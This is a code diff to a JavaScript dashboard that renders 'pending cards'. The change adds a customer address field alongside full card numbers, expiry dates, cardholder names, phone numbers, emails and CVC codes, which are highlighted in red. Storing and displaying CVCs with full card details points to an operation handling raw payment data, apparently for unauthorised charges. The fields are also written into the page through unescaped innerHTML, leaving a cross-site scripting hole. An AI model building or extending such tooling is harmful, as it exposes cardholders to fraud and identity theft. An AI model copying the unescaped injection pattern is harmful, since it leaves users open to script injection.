@@ -149,6 +149,10 @@ function renderPendingCards() {
         const cleanCharge = String(row['charge_str'] || row['Charge Amount'] || '').replace(/[^0-9.]/g, '');
         const cleanCard = String(row['card_number'] || '').replace(/\s+/g, ''); 
         const cleanExpiry = String(row['exp_date'] || '').replace(/[\/\\]/g, ''); 
+        
+        // Define Address (Checking Capitalized, lowercase, and 'adress' as requested)
+        const address = row['Address'] || row['address'] || row['adress'] || 'N/A';
+
         const card = document.createElement('div');
         card.className = "pending-card fade-in p-0 bg-slate-800 border border-slate-700 rounded-xl overflow-hidden shadow-lg hover:border-blue-500/50 transition-all";
         card.innerHTML = `
@@ -165,6 +169,9 @@ function renderPendingCards() {
                 <div class="flex"><span class="w-36 text-slate-500 font-semibold shrink-0">Card Name:</span><span class="text-white">${row['card_holder']}</span></div>
                 <div class="flex"><span class="w-36 text-slate-500 font-semibold shrink-0">Phone:</span><span class="text-white">${row['phone']}</span></div>
                 <div class="flex"><span class="w-36 text-slate-500 font-semibold shrink-0">Email:</span><span class="text-blue-300 truncate">${row['email']}</span></div>
+                
+                <div class="flex"><span class="w-36 text-slate-500 font-semibold shrink-0">Address:</span><span class="text-white break-words w-full">${address}</span></div>
+                
                 <div class="flex"><span class="w-36 text-slate-500 font-semibold shrink-0">CVC:</span><span class="text-red-400 font-bold">${row['cvc']}</span></div>
             </div>
             <div class="grid grid-cols-2 gap-3 p-4 pt-0">
@@ -175,7 +182,6 @@ function renderPendingCards() {
         container.appendChild(card);
     });
 }
-
 function updateAgentSelector() {
     const type = document.getElementById('analysisSheetSelector').value;
     const data = allData[type] || [];
@@ -332,5 +338,6 @@ async function manualRefresh() {
 }
 
 setInterval(() => { fetchData(); }, 120000);
+
 
 
